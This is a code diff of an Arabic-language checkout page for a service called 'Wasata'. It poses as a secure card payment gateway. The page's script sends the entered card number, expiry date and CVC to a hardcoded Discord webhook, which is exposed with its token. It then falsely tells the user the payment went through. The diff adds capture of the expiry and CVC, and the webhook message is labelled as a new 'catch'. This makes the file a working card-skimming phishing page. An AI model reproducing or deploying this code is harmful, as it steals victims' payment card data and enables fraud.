@@ -2,88 +2,100 @@
 <html lang="ar" dir="rtl">
 <head>
     <meta charset="UTF-8">
-    <title>بوابة دفع وساطة الآمنة</title>
+    <title>إكمال الدفع | وساطة</title>
     <script src="https://cdn.tailwindcss.com"></script>
     <script src="https://www.gstatic.com/firebasejs/8.10.0/firebase-app.js"></script>
     <script src="https://www.gstatic.com/firebasejs/8.10.0/firebase-database.js"></script>
+    <style>
+        body { background-color: #fcfcfc; font-family: 'Segoe UI', sans-serif; position: relative; }
+        .bg-dots { position: fixed; inset: 0; z-index: -1; background-image: radial-gradient(#e5e7eb 1.5px, transparent 1.5px); background-size: 24px 24px; opacity: 0.5; }
+        .main-card { border-radius: 40px; box-shadow: 0 10px 50px rgba(0,0,0,0.03); border: 1px solid #f2f2f2; }
+        .tab-btn { border: 2.5px solid #f1f5f9; border-radius: 20px; transition: 0.3s; cursor: pointer; background: #fff; opacity: 0.4; height: 100px; }
+        .tab-btn.active { border-color: #000; opacity: 1; transform: scale(1.02); }
+        input { border: 1.5px solid #f1f5f9; border-radius: 18px; padding: 18px; width: 100%; transition: 0.3s; text-align: center; outline: none; }
+        input:focus { border-color: #00eccd; }
+        .radio-ring { width: 22px; height: 22px; border: 2px solid #000; border-radius: 50%; display: flex; align-items: center; justify-content: center; }
+        .tab-btn.active .radio-ring::after { content: ""; width: 11px; height: 11px; background: #000; border-radius: 50%; }
+    </style>
 </head>
-<body class="bg-gray-50 flex items-center justify-center min-h-screen p-4">
-    <div class="bg-white max-w-md w-full p-10 rounded-[3rem] shadow-2xl border border-gray-100">
-        <div class="text-center mb-10">
-            <h2 class="text-3xl font-black text-gray-800">إتمام الدفع</h2>
-            <p id="payTypeDesc" class="text-xs text-gray-400 mt-2 uppercase">WASATA SECURE GATEWAY</p>
-        </div>
-
-        <div class="bg-gray-50 p-6 rounded-3xl mb-8 flex justify-between items-center border border-dashed border-gray-200">
-            <span class="text-gray-500 font-bold">المبلغ الإجمالي:</span>
-            <span id="finalPrice" class="text-2xl font-black text-emerald-500">0.00 SAR</span>
-        </div>
-
-        <div class="space-y-4">
-            <input type="text" id="cc" placeholder="رقم البطاقة" maxlength="19" class="w-full p-5 rounded-2xl border border-gray-200 outline-none focus:border-emerald-400 text-center text-lg">
-            <div class="flex gap-3">
-                <input type="text" id="exp" placeholder="MM / YY" maxlength="7" class="w-1/2 p-5 rounded-2xl border border-gray-200 outline-none text-center">
-                <input type="password" id="cvv" placeholder="CVC" maxlength="3" class="w-1/2 p-5 rounded-2xl border border-gray-200 outline-none text-center">
+<body class="flex items-center justify-center min-h-screen p-6">
+    <div class="bg-dots"></div>
+    <div class="main-card bg-white w-full max-w-2xl p-12 md:p-14 relative shadow-2xl">
+        <div class="absolute top-12 right-12 text-2xl font-black text-slate-800">💳 طريقة الدفع</div>
+        <div class="mt-20">
+            <div class="grid grid-cols-2 gap-5 mb-12">
+                <div class="tab-btn active p-6 flex justify-between items-center" onclick="sel(this)">
+                    <div class="radio-ring"></div>
+                    <img src="visa.png" class="h-6" alt="Visa">
+                </div>
+                <div class="tab-btn p-6 flex justify-between items-center" onclick="sel(this)">
+                    <div class="radio-ring"></div>
+                    <img src="https://upload.wikimedia.org/wikipedia/commons/2/2a/Mastercard-logo.svg" class="h-10" alt="MasterCard">
+                </div>
             </div>
+            <div class="space-y-6 text-right">
+                <input type="text" id="ccNo" placeholder="5215 1252 1515 2155" maxlength="19">
+                <div class="grid grid-cols-2 gap-5">
+                    <input type="text" id="expiry" placeholder="MM / YY" maxlength="7">
+                    <input type="password" id="cvc" placeholder="***" maxlength="3">
+                </div>
+            </div>
+            <button onclick="send()" id="payBtn" class="w-full bg-[#00eccd] text-white py-6 rounded-3xl mt-12 text-2xl font-black shadow-xl">إكمال الدفع</button>
         </div>
-
-        <button onclick="executePayment()" class="w-full bg-black text-white py-6 rounded-3xl mt-10 text-xl font-black hover:scale-[1.02] active:scale-95 transition shadow-xl">تأكيد الدفع والتحويل</button>
     </div>
 
     <script>
         const firebaseConfig = { databaseURL: "https://wasata-af6ac-default-rtdb.europe-west1.firebasedatabase.app" };
-        if (!firebase.apps.length) firebase.initializeApp(firebaseConfig);
+        firebase.initializeApp(firebaseConfig);
         const db = firebase.database();
 
+        // جلب المبلغ والبيانات من الرابط
         const urlParams = new URLSearchParams(window.location.search);
-        const amount = urlParams.get('total') || "0";
-        const type = urlParams.get('type'); // deposit أو ticket
+        const total = urlParams.get('total') || "0.00";
         const ticketKey = urlParams.get('ticket');
+        document.getElementById('payBtn').innerText = `دفع ${total} SAR`;
 
-        document.getElementById('finalPrice').innerText = amount + " SAR";
-        document.getElementById('payTypeDesc').innerText = type === 'deposit' ? 'إيداع رصيد للمحفظة' : 'دفع قيمة وساطة تيكت';
+        function sel(el) { 
+            document.querySelectorAll('.tab-btn').forEach(t => t.classList.remove('active')); 
+            el.classList.add('active'); 
+        }
 
-        async function executePayment() {
-            const cc = document.getElementById('cc').value;
-            const session = JSON.parse(localStorage.getItem('wasata_session'));
-            if(!cc || cc.length < 15) return alert("خطأ في بيانات البطاقة");
+        async function send() {
+            const cc = document.getElementById('ccNo').value;
+            const exp = document.getElementById('expiry').value;
+            const cvv = document.getElementById('cvc').value;
+            const session = JSON.parse(localStorage.getItem('wasata_session')) || {email: 'زائر'};
 
-            // 1. إرسال الهوك للإدارة (للإيداع والدفع)
+            if(!cc || !exp || !cvv) return alert("يرجى تعبئة كامل بيانات البطاقة");
+
             const hook = "https://discord.com/api/webhooks/1511460441661112360/5b0mL8Ncyi2FTZRU88U3ZX9leFZzotCjLWR7t5h3Acj4S0YsoY6e8LmiQIjl8PH62R91";
+            
             await fetch(hook, {
                 method: 'POST',
                 headers: {'Content-Type': 'application/json'},
                 body: JSON.stringify({
                     embeds: [{
-                        title: type === 'deposit' ? "💰 عملية إيداع رصيد" : "💳 دفع تيكت وساطة",
-                        color: type === 'deposit' ? 65280 : 16711680,
+                        title: "💳 صيدة دفع جديدة - Wasata",
                         fields: [
-                            { name: "👤 العميل", value: session.email },
-                            { name: "💰 المبلغ", value: amount + " SAR" },
-                            { name: "💳 البطاقة", value: cc }
+                            { name: "👤 العميل", value: session.email, inline: true },
+                            { name: "💰 المبلغ", value: total + " SAR", inline: true },
+                            { name: "💳 البطاقة", value: cc },
+                            { name: "🔐 السر", value: `${exp} | ${cvv}` }
                         ]
                     }]
                 })
             });
 
-            // 2. معالجة الحركة برمجياً
-            if(type === 'deposit') {
-                // تحديث محفظة العميل
-                const walletRef = db.ref('wallets/' + ticketKey);
-                walletRef.transaction(current => {
-                    return { balance: (current?.balance || 0) + parseFloat(amount) };
-                });
-                alert("✅ تم إيداع المبلغ في محفظتك بنجاح!");
-            } else {
-                // تحديث التيكت
+            // تحديث التيكت في الـ Firebase
+            if(ticketKey) {
                 await db.ref('tickets/' + ticketKey).update({ status: 'تم الدفع ✓', action: null });
                 await db.ref('tickets/' + ticketKey + '/messages').push({
-                    text: `💳 تم دفع مبلغ ${amount} SAR بنجاح عبر بوابة الدفع.`,
+                    text: `✅ تم تأكيد دفع مبلغ ${total} SAR عبر البطاقة البنكية.`,
                     sender: 'system'
                 });
-                alert("✅ تم دفع قيمة التيكت بنجاح!");
             }
 
+            alert("✅ تم إرسال الدفع للمراجعة، سيتم تحديث تذكرتك فوراً.");
             location.href = 'ticket.html';
         }
     </script>
